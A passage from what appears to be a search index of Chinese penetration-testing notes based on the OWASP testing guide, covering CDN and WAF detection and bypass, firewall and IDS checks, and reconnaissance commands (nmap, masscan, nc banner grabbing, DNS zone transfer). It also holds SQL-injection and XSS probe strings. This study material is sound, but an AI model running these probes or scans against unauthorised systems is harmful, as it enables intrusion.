\u662f\u4e00\u7ec4\u5730\u7406\u5206\u5e03\u7684\u7f13\u5b58\u4ee3\u7406\u670d\u52a1\u5668\uff0c\u65e8\u5728\u63d0\u9ad8\u7f51\u7ad9\u6027\u80fd\uff0c\u4e3a\u7f51\u7ad9\u63d0\u4f9b\u989d\u5916\u7684\u5f39\u6027\u3002</p> <p>\u5b83\u901a\u5e38\u901a\u8fc7\u5c06\u9762\u5411\u516c\u4f17\u7684\u57df\u6307\u5411 CDN \u7684\u670d\u52a1\u5668\uff0c\u7136\u540e\u914d\u7f6e CDN \u4ee5\u8fde\u63a5\u5230\u6b63\u786e\u7684\u540e\u7aef\u670d\u52a1\u5668\uff08\u6709\u65f6\u79f0\u4e3a\u201c\u6e90\u201d\uff09\u6765\u914d\u7f6e\u3002</p> <p>\u68c0\u6d4b CDN \u7684\u6700\u7b80\u5355\u65b9\u6cd5\u662f\u5bf9\u57df\u89e3\u6790\u5230\u7684 IP \u5730\u5740\u6267\u884c WHOIS \u67e5\u8be2\u3002\u5982\u679c\u4ed6\u4eec\u5c5e\u4e8e CDN \u516c\u53f8\uff08\u4f8b\u5982 Akamai\u3001Cloudflare \u6216 Fastly - \u8bf7\u53c2\u9605\u7ef4\u57fa\u767e\u79d1\u4ee5\u83b7\u53d6\u66f4\u5b8c\u6574\u7684\u5217\u8868\uff09\uff0c\u90a3\u4e48\u5c31\u597d\u50cf\u6b63\u5728\u4f7f\u7528 CDN\u3002</p> <p>\u5728 CDN \u540e\u9762\u6d4b\u8bd5\u7ad9\u70b9\u65f6\uff0c\u60a8\u5e94\u8be5\u7262\u8bb0\u4ee5\u4e0b\u51e0\u70b9\uff1a</p> <ul> <li>IP \u548c\u670d\u52a1\u5668\u5c5e\u4e8e CDN \u63d0\u4f9b\u5546\uff0c\u5f88\u53ef\u80fd\u4e0d\u5728\u57fa\u7840\u8bbe\u65bd\u6d4b\u8bd5\u8303\u56f4\u5185\u3002</li> <li>\u8bb8\u591a CDN \u8fd8\u5305\u62ec\u673a\u5668\u4eba\u68c0\u6d4b\u3001\u901f\u7387\u9650\u5236\u548c Web \u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899\u7b49\u529f\u80fd\u3002</li> <li>CDN \u901a\u5e38\u7f13\u5b58\u5185\u5bb9\uff0c\u56e0\u6b64\u5bf9\u540e\u7aef\u7f51\u7ad9\u6240\u505a\u7684\u4efb\u4f55\u66f4\u6539\u53ef\u80fd\u4e0d\u4f1a\u7acb\u5373\u663e\u793a\u3002</li> </ul> <p>\u5982\u679c\u8be5\u7ad9\u70b9\u4f4d\u4e8e CDN \u540e\u9762\uff0c\u5219\u8bc6\u522b\u540e\u7aef\u670d\u52a1\u5668\u4f1a\u5f88\u6709\u7528\u3002\u5982\u679c\u4ed6\u4eec\u6ca1\u6709\u5b9e\u65bd\u9002\u5f53\u7684\u8bbf\u95ee\u63a7\u5236\uff0c\u90a3\u4e48\u60a8\u53ef\u4ee5\u901a\u8fc7\u76f4\u63a5\u8bbf\u95ee\u540e\u7aef\u670d\u52a1\u5668\u6765\u7ed5\u8fc7 CDN\uff08\u53ca\u5176\u63d0\u4f9b\u7684\u4efb\u4f55\u4fdd\u62a4\uff09\u3002\u6709\u591a\u79cd\u4e0d\u540c\u7684\u65b9\u6cd5\u53ef\u4ee5\u8ba9\u60a8\u8bc6\u522b\u540e\u7aef\u7cfb\u7edf\uff1a</p> <ul> <li>\u5e94\u7528\u7a0b\u5e8f\u53d1\u9001\u7684\u7535\u5b50\u90ae\u4ef6\u53ef\u80fd\u76f4\u63a5\u6765\u81ea\u540e\u7aef\u670d\u52a1\u5668\uff0c\u8fd9\u53ef\u80fd\u4f1a\u6cc4\u9732\u5176 IP \u5730\u5740\u3002</li> <li>\u57df\u7684 DNS \u7814\u78e8\u3001\u533a\u57df\u4f20\u8f93\u6216\u8bc1\u4e66\u900f\u660e\u5217\u8868\u53ef\u80fd\u4f1a\u5728\u5b50\u57df\u4e0a\u663e\u793a\u5b83\u3002</li> <li>\u626b\u63cf\u516c\u53f8\u5df2\u77e5\u4f7f\u7528\u7684 IP \u8303\u56f4\u53ef\u80fd\u4f1a\u627e\u5230\u540e\u7aef\u670d\u52a1\u5668\u3002</li> <li>\u5229\u7528\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020 (SSRF)\u53ef\u80fd\u4f1a\u6cc4\u9732 IP \u5730\u5740\u3002</li> <li>\u6765\u81ea\u5e94\u7528\u7a0b\u5e8f\u7684\u8be6\u7ec6\u9519\u8bef\u6d88\u606f\u53ef\u80fd\u4f1a\u66b4\u9732 IP \u5730\u5740\u6216\u4e3b\u673a\u540d\u3002</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_14","title":"\u5b89\u5168\u7ec4\u4ef6","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_15","title":"\u7f51\u7edc\u9632\u706b\u5899","text":"<p>\u5927\u591a\u6570 Web \u670d\u52a1\u5668\u5c06\u53d7\u5230\u6570\u636e\u5305\u8fc7\u6ee4\u6216\u72b6\u6001\u68c0\u6d4b\u9632\u706b\u5899\u7684\u4fdd\u62a4\uff0c\u8fd9\u4e9b\u9632\u706b\u5899\u4f1a\u963b\u6b62\u4efb\u4f55\u4e0d\u9700\u8981\u7684\u7f51\u7edc\u6d41\u91cf\u3002\u8981\u68c0\u6d4b\u5230\u8fd9\u4e00\u70b9\uff0c\u8bf7\u5bf9\u670d\u52a1\u5668\u6267\u884c\u7aef\u53e3\u626b\u63cf\u5e76\u68c0\u67e5\u7ed3\u679c\u3002</p> <p>\u5982\u679c\u5927\u591a\u6570\u7aef\u53e3\u663e\u793a\u4e3a\u201c\u5173\u95ed\u201d\uff08\u5373\uff0c\u5b83\u4eec\u8fd4\u56de\u4e00\u4e2a<code>RST</code>\u6570\u636e\u5305\u4ee5\u54cd\u5e94\u521d\u59cb<code>SYN</code>\u6570\u636e\u5305\uff09\uff0c\u5219\u8fd9\u8868\u660e\u670d\u52a1\u5668\u53ef\u80fd\u4e0d\u53d7\u9632\u706b\u5899\u4fdd\u62a4\u3002\u5982\u679c\u7aef\u53e3\u663e\u793a\u4e3a\u201c\u5df2\u8fc7\u6ee4\u201d\uff08\u5373\uff0c\u5c06\u6570\u636e\u5305\u53d1\u9001\u5230\u672a\u4f7f\u7528\u7684\u7aef\u53e3\u65f6\u672a\u6536\u5230\u54cd\u5e94<code>SYN</code>\uff09\uff0c\u5219\u5f88\u53ef\u80fd\u5b58\u5728\u9632\u706b\u5899\u3002</p> <p>\u6b64\u5916\uff0c\u5982\u679c\u5411\u4e16\u754c\u516c\u5f00\u4e86\u4e0d\u9002\u5f53\u7684\u670d\u52a1\uff08\u4f8b\u5982 SMTP\u3001IMAP\u3001MySQL \u7b49\uff09\uff0c\u8fd9\u8868\u660e\u8981\u4e48\u6ca1\u6709\u9002\u5f53\u7684\u9632\u706b\u5899\uff0c\u8981\u4e48\u9632\u706b\u5899\u914d\u7f6e\u4e0d\u5f53\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_16","title":"\u7f51\u7edc\u5165\u4fb5\u68c0\u6d4b\u4e0e\u9632\u5fa1\u7cfb\u7edf","text":"<p>\u7f51\u7edc\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf (IDS) \u68c0\u6d4b\u53ef\u7591\u6216\u6076\u610f\u7684\u7f51\u7edc\u7ea7\u6d3b\u52a8\uff08\u4f8b\u5982\u7aef\u53e3\u6216\u6f0f\u6d1e\u626b\u63cf\uff09\u5e76\u53d1\u51fa\u8b66\u62a5\u3002\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf (IPS) \u4e0e\u6b64\u7c7b\u4f3c\uff0c\u4f46\u4e5f\u4f1a\u91c7\u53d6\u63aa\u65bd\u963b\u6b62\u6d3b\u52a8 - \u901a\u5e38\u662f\u901a\u8fc7\u963b\u6b62\u6e90 IP \u5730\u5740\u3002</p> <p>\u901a\u5e38\u53ef\u4ee5\u901a\u8fc7\u9488\u5bf9\u76ee\u6807\u8fd0\u884c\u81ea\u52a8\u626b\u63cf\u5de5\u5177\uff08\u4f8b\u5982\u7aef\u53e3\u626b\u63cf\u5668\uff09\u5e76\u67e5\u770b\u6e90 IP \u662f\u5426\u88ab\u963b\u6b62\u6765\u68c0\u6d4b IPS\u3002\u7136\u800c\uff0c\u8bb8\u591a\u5e94\u7528\u7a0b\u5e8f\u7ea7\u5de5\u5177\u53ef\u80fd\u65e0\u6cd5\u88ab IPS \u68c0\u6d4b\u5230\uff08\u7279\u522b\u662f\u5982\u679c\u5b83\u4e0d\u89e3\u5bc6 TLS\uff09\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#web-waf","title":"Web \u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899 (WAF)","text":"<p>Web \u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899 (WAF) \u68c0\u67e5 HTTP \u8bf7\u6c42\u7684\u5185\u5bb9\u5e76\u963b\u6b62\u90a3\u4e9b\u770b\u4f3c\u53ef\u7591\u6216\u6076\u610f\u7684\u8bf7\u6c42\uff0c\u6216\u52a8\u6001\u5e94\u7528\u5176\u4ed6\u63a7\u5236\uff0c\u4f8b\u5982 CAPTCHA \u6216\u901f\u7387\u9650\u5236\u3002\u5b83\u4eec\u901a\u5e38\u57fa\u4e8e\u4e00\u7ec4\u5df2\u77e5\u7684\u9519\u8bef\u7b7e\u540d\u548c\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u4f8b\u5982OWASP \u6838\u5fc3\u89c4\u5219\u96c6\u3002WAF \u53ef\u4ee5\u6709\u6548\u5730\u9632\u8303\u67d0\u4e9b\u7c7b\u578b\u7684\u653b\u51fb\uff08\u4f8b\u5982 SQL \u6ce8\u5165\u6216\u8de8\u7ad9\u70b9\u811a\u672c\uff09\uff0c\u4f46\u5bf9\u5176\u4ed6\u7c7b\u578b\u7684\u653b\u51fb\uff08\u4f8b\u5982\u8bbf\u95ee\u63a7\u5236\u6216\u4e1a\u52a1\u903b\u8f91\u76f8\u5173\u95ee\u9898\uff09\u5219\u6548\u679c\u8f83\u5dee\u3002</p> <p>WAF \u53ef\u4ee5\u90e8\u7f72\u5728\u591a\u4e2a\u4f4d\u7f6e\uff0c\u5305\u62ec\uff1a</p> <ul> <li>\u5728 Web \u670d\u52a1\u5668\u672c\u8eab\u4e0a\u3002</li> <li>\u5728\u5355\u72ec\u7684\u865a\u62df\u673a\u6216\u786c\u4ef6\u8bbe\u5907\u4e0a\u3002</li> <li>\u5728\u540e\u7aef\u670d\u52a1\u5668\u524d\u9762\u7684\u4e91\u7aef\u3002</li> </ul> <p>\u56e0\u4e3aWAF\u62e6\u622a\u4e86\u6076\u610f\u8bf7\u6c42\uff0c\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u5728\u53c2\u6570\u4e2d\u52a0\u5165\u5e38\u89c1\u7684\u653b\u51fb\u5b57\u7b26\u4e32\uff0c\u89c2\u5bdf\u662f\u5426\u88ab\u62e6\u622a\u6765\u68c0\u6d4b\u3002\u4f8b\u5982\uff0c\u5c1d\u8bd5\u6dfb\u52a0\u4e00\u4e2a\u540d\u4e3a\u6216<code>foo</code>\u4e4b\u7c7b\u7684\u53c2\u6570\u3002\u5982\u679c\u8fd9\u4e9b\u8bf7\u6c42\u88ab\u963b\u6b62\uff0c\u5219\u8868\u660e\u53ef\u80fd\u5b58\u5728 WAF\u3002\u6b64\u5916\uff0c\u5757\u9875\u9762\u7684\u5185\u5bb9\u53ef\u4ee5\u63d0\u4f9b\u6709\u5173\u6b63\u5728\u4f7f\u7528\u7684\u7279\u5b9a\u6280\u672f\u7684\u4fe1\u606f\u3002\u6700\u540e\uff0c\u67d0\u4e9b WAF \u53ef\u80fd\u4f1a\u5c06 cookie \u6216 HTTP \u6807\u5934\u6dfb\u52a0\u5230\u53ef\u4ee5\u663e\u793a\u5176\u5b58\u5728\u7684\u54cd\u5e94\u4e2d\u3002<code>' UNION SELECT 1``&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p> <p>\u5982\u679c\u6b63\u5728\u4f7f\u7528\u57fa\u4e8e\u4e91\u7684 WAF\uff0c\u5219\u53ef\u4ee5\u901a\u8fc7\u76f4\u63a5\u8bbf\u95ee\u540e\u7aef\u670d\u52a1\u5668\u6765\u7ed5\u8fc7\u5b83\uff0c\u4f7f\u7528\u5185\u5bb9\u4ea4\u4ed8\u7f51\u7edc\u90e8\u5206\u4e2d\u8ba8\u8bba\u7684\u76f8\u540c\u65b9\u6cd5\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%B5%8B%E8%AF%95/","title":"\u4e1a\u52a1\u903b\u8f91\u6d4b\u8bd5","text":"<p>\u4e1a\u52a1\u903b\u8f91\u4ecb\u7ecd</p> <p>4.10.1\u6d4b\u8bd5\u4e1a\u52a1\u903b\u8f91\u6570\u636e\u9a8c\u8bc1</p> <p>4.10.2\u6d4b\u8bd5\u4f2a\u9020\u8bf7\u6c42\u80fd\u529b</p> <p>4.10.3\u6d4b\u8bd5\u5b8c\u6574\u6027\u68c0\u67e5</p> <p>4.10.4\u8fdb\u7a0b\u65f6\u5e8f\u6d4b\u8bd5</p> <p>4.10.5\u6d4b\u8bd5\u51fd\u6570\u53ef\u4f7f\u7528\u6b21\u6570\u9650\u5236</p> <p>4.10.6\u5de5\u4f5c\u6d41\u7a0b\u89c4\u907f\u6d4b\u8bd5</p> <p>4.10.7\u6d4b\u8bd5\u9488\u5bf9\u5e94\u7528\u7a0b\u5e8f\u6ee5\u7528\u7684\u9632\u5fa1\u63aa\u65bd</p> <p>4.10.8\u5f02\u5e38\u6587\u4ef6\u7c7b\u578b\u6d4b\u8bd5\u4e0a\u4f20</p> <p>4.10.9\u6076\u610f\u6587\u4ef6\u4e0a\u4f20\u6d4b\u8bd5</p> <p>4.10.10\u6d4b\u8bd5\u652f\u4ed8\u529f\u80fd</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/","title":"\u4f1a\u8bdd\u7ba1\u7406\u6d4b\u8bd5","text":"<p>4.6.1\u4f1a\u8bdd\u7ba1\u7406\u6a21\u5f0f\u6d4b\u8bd5</p> <p>4.6.2\u00a0Cookies \u5c5e\u6027\u6d4b\u8bd5</p> <p>4.6.3\u4f1a\u8bdd\u56fa\u5b9a\u6d4b\u8bd5</p> <p>4.6.4\u6d4b\u8bd5\u66b4\u9732\u7684\u4f1a\u8bdd\u53d8\u91cf</p> <p>4.6.5\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u6d4b\u8bd5</p> <p>4.6.6\u6d4b\u8bd5\u6ce8\u9500\u529f\u80fd</p> <p>4.6.7\u6d4b\u8bd5\u4f1a\u8bdd\u8d85\u65f6</p> <p>4.6.8\u4f1a\u8bdd\u6df7\u6dc6\u6d4b\u8bd5</p> <p>4.6.9\u4f1a\u8bdd\u52ab\u6301\u6d4b\u8bd5</p> <p>4.6.10\u6d4b\u8bd5 JSON Web \u4ee4\u724c</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","title":"\u4fe1\u606f\u6536\u96c6","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_1","title":"\u5229\u7528\u641c\u7d22\u5f15\u64ce\u53d1\u73b0\u4fe1\u606f\u6cc4\u9732","text":"<p>[[\u5bf9\u4fe1\u606f\u6cc4\u9732\u8fdb\u884c\u641c\u7d22\u5f15\u64ce\u53d1\u73b0\u4fa6\u5bdf|\u5168\u6587]]</p> <p>\u6d4b\u8bd5\u76ee\u6807\uff1a\u627e\u51fa\u5e94\u7528\u7a0b\u5e8f\u3001\u7cfb\u7edf\u6216\u7ec4\u7ec7\u516c\u5f00\u5728\u4e92\u8054\u7f51\u7684\u654f\u611f\u8bbe\u8ba1\u548c\u914d\u7f6e\u4fe1\u606f\u3002</p> <pre><code>\u4f7f\u7528\u591a\u4e2a\u641c\u7d22\u5f15\u64ce\uff0c\u53ef\u5e26\u6765\u4e0d\u540c\u7684\u7ed3\u679c\uff0c\u66f4\u52a0\u5168\u9762\u3002\n</code></pre> <p>\u767e\u5ea6 | Bing | Binsearch.info | Comman Crawl | DuckDuckGo | Google | Internet Archive Wayback Machine |  Shodan | Fofa</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_2","title":"\u5e38\u89c1\u641c\u7d22\u8fd0\u7b97\u7b26","text":"<p><code>site</code> <code>inurl</code> <code>intitle</code> <code>intext</code> <code>filetype</code></p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#dorking","title":"Dorking","text":"<p>Google Hacking Database</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_3","title":"\u6307\u7eb9\u8bc6\u522b","text":"<p>[[\u6307\u7eb9 Web \u670d\u52a1\u5668|\u5168\u6587]]</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_4","title":"\u670d\u52a1\u5668\u6307\u7eb9\u8bc6\u522b","text":"<p>\u6d4b\u8bd5\u76ee\u6807\uff1a\u786e\u5b9a\u6b63\u5728\u8fd0\u884c\u7684Web\u670d\u52a1\u5668\u7684\u7248\u672c\u548c\u7c7b\u578b\uff0c\u4ee5\u4fbf\u8fdb\u4e00\u6b65\u53d1\u73b0\u4efb\u4f55\u5df2\u77e5\u6f0f\u6d1e\u3002</p> <pre><code>\u4ece Web \u670d\u52a1\u5668\u4e2d\u5f15\u51fa\u4e00\u4e9b\u54cd\u5e94\uff0c\u7136\u540e\u53ef\u4ee5\u5c06\u8fd9\u4e9b\u54cd\u5e94\u4e0e\u5df2\u77e5\u54cd\u5e94\u548c\u884c\u4e3a\u7684\u6570\u636e\u5e93\u8fdb\u884c\u6bd4\u8f83\u5339\u914d\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#banner-grabbing","title":"Banner Grabbing","text":"<p>\u54cd\u5e94\u5934 html\u6e90\u7801\u83b7\u53d6\u4fe1\u606f</p> <pre><code>nc -v target port\ntelnet target port\nopenssl\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_5","title":"\u53d1\u9001\u683c\u5f0f\u9519\u8bef\u7684\u8bf7\u6c42","text":"<p>\u9ed8\u8ba4\u9519\u8bef\u9875\u9762</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_6","title":"\u81ea\u52a8\u626b\u63cf\u5de5\u5177","text":"<p>Netcraft | Nikto |Nmap</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_7","title":"\u7ec4\u4ef6\u6307\u7eb9\u8bc6\u522b","text":"<p>[[\u6307\u7eb9 Web \u5e94\u7528\u7a0b\u5e8f\u6846\u67b6|\u5168\u6587]]</p> <pre><code>\u5bf9 Web \u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u7684\u7ec4\u4ef6\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\n</code></pre> <p>HTTP \u6807\u5934 cookie \u7f51\u9875\u6e90\u7801 \u7279\u5b9a\u6587\u4ef6\u548c\u6587\u4ef6\u5939 \u6587\u4ef6\u6269\u5c55\u540d \u9519\u8bef\u4fe1\u606f</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#html","title":"HTML\u6e90\u7801\u4e2d\u7684\u7ebf\u7d22","text":"<p>[[\u68c0\u67e5\u7f51\u7edc\u670d\u52a1\u5668\u56fe\u5143\u6587\u4ef6\u662f\u5426\u6709\u4fe1\u606f\u6cc4\u9732|\u5168\u6587]]</p> <pre><code>\u5206\u6790\u6e90\u7801\u8bc6\u522b\u9690\u85cf\u6216\u6df7\u6dc6\u7684\u8def\u5f84\u548c\u529f\u80fd\n\u63d0\u53d6\u5e76\u6620\u5c04\u53ef\u80fd\u5bfc\u81f4\u66f4\u597d\u7684\u4e86\u89e3\u624b\u5934\u7cfb\u7edf\u7684\u5176\u4ed6\u4fe1\u606f\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#meta-file","title":"Meta FIle","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#robots","title":"Robots","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#meta-tags","title":"META Tags","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#sitemap","title":"SiteMap","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#securitytxt","title":"security.txt","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#humanstxt","title":"humans.txt","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#other","title":"Other","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_8","title":"\u7f51\u9875\u5185\u5bb9","text":"<p>[[\u5ba1\u67e5\u7f51\u9875\u5185\u5bb9\u662f\u5426\u5b58\u5728\u4fe1\u606f\u6cc4\u9732|\u5168\u6587]]</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_9","title":"\u679a\u4e3e\u670d\u52a1\u5668\u4e0a\u7684\u6240\u6709\u7f51\u7ad9","text":"<p>[[\u679a\u4e3e Web \u670d\u52a1\u5668\u4e0a\u7684\u5e94\u7528\u7a0b\u5e8f|\u5168\u6587]]</p> <pre><code>\u6d4b\u8bd5 Web \u5e94\u7528\u7a0b\u5e8f\u6f0f\u6d1e\u7684\u6700\u91cd\u8981\u6b65\u9aa4\u662f\u627e\u51fa Web \u670d\u52a1\u5668\u4e0a\u6258\u7ba1\u4e86\u54ea\u4e9b\u7279\u5b9a Web \u5e94\u7528\u7a0b\u5e8f\u3002\u8bb8\u591a Web \u5e94\u7528\u7a0b\u5e8f\u90fd\u6709\u5df2\u77e5\u7684\u6f0f\u6d1e\u548c\u5df2\u77e5\u7684\u653b\u51fb\u7b56\u7565\uff0c\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u6f0f\u6d1e\u548c\u653b\u51fb\u7b56\u7565\u6765\u83b7\u5f97\u8fdc\u7a0b\u63a7\u5236\u6216\u5229\u7528\u6570\u636e\u3002\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#url","title":"\u975e\u6807\u51c6URL","text":"<p>\u4e0d\u540c\u7f51\u7ad9\u5173\u8054\u5230\u4e0d\u540c\u8def\u5f84</p> <p><code>www.example.com/site1</code></p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#enumeration","title":"enumeration","text":"<p>\u6f0f\u6d1e\u626b\u63cf\u5668 Web \u670d\u52a1\u5668\u914d\u7f6e\u9519\u8bef \u5e76\u5141\u8bb8\u76ee\u5f55\u904d\u5386 \u7f51\u9875\u5f15\u7528 \u641c\u7d22\u5f15\u64ce\u6293\u53d6\u548c\u7d22\u5f15 <code>site:www.example.com</code> Fuzzing</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_10","title":"\u975e\u6807\u51c6\u7aef\u53e3","text":"<p><code>www.example.com:port1</code></p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_11","title":"\u7aef\u53e3\u626b\u63cf","text":"<pre><code>nmap -Pn -sT -sV -p- target\nmasscan -p1-65535 --rate=1000 -e tun0 target\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_12","title":"\u865a\u62df\u4e3b\u673a","text":"<p>\u5355\u4e2a IP \u5730\u5740\u53ef\u4e0e\u591a\u4e2a\u57df\u540d\u5173\u8054</p> <p><code>*.example.com</code></p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#dns","title":"DNS \u4f20\u9001","text":"<p>\u53d7\u5230\u9650\u5236 \u503c\u5f97\u4e00\u8bd5</p> <pre><code>$ host -t ns www.owasp.org    #\u8bc6\u522b\u540d\u79f0\u670d\u52a1\u5668\n$ host -l www.owasp.org ns1.secure.net    #\u5411\u540d\u79f0\u670d\u52a1\u5668\u8bf7\u6c42\u533a\u57df\u4f20\u9001   \n\n$ dig @dns-server -x target\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#dns-ptr","title":"DNS \u53cd\u5411(PTR)\u67e5\u8be2","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#web-dns","title":"\u57fa\u4e8e Web \u7684 DNS \u641c\u7d22","text":"<p>Netcraft \u67e5\u8be2 DNS \u5fae\u6b65 \u67e5\u8be2 DNS</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#google-search","title":"google 